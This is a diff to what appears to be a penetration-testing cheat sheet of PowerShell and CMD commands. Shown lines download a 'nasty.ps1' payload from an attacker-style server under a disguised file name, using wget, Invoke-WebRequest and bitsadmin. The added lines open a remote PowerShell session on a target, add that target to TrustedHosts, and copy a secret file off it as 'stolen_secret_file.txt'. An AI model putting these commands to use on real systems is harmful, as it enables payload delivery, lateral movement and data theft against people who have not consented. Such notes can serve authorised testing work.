@@ -19,9 +19,15 @@ wget "http://123.123.123.1/nasty.ps1" -outfile "not_nasty_at_all.ps1"
 #If you need credentials to do something (PS will prompt for pw):
 Invoke-WebRequest -Uri "http://123.123.123.1/nasty.ps1" -OutFile "C:\temp\not_nasty_at_all.ps1" -Credential "UserName"
 
-#Transfer a file over Powershell remote:
+#Create a remote PowerShell session (if you see port 5985 open):
 $sess = New-PSSession -ComputerName 10.20.30.40 -Credential username
+#Use it interactively
+Enter-PsSession $sess
+#If the remote session fails due to target host not being trusted, you can add it to trusted hosts:
+Set-Item -Path WSMan:\localhost\Client\TrustedHosts -Value "10.10.10.161"
+#Or transfer a file over Powershell remote session:
 Copy-Item -FromSession $sess C:\Users\remote_user\Desktop\very_secret_file.txt -Destination C:\Users\local_user\Desktop\stolen_secret_file.txt
+
 
 #CMD
 bitsadmin /transfer downloadJob /download /priority normal http://my.offensive.server/nasty.ps1 c:\nice.ps1
